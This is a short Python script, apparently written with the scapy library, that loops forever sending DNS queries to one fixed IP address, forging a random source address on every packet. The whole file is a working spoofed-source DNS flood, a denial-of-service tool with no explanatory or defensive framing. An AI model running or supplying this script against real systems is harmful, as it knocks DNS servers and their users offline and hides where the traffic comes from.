from scapy.all import IP, UDP, DNS, DNSQR, send
import random

target = "172.28.86.29"

while True:
    src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
    packet = IP(dst=target, src=src_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
    send(packet, verbose=0)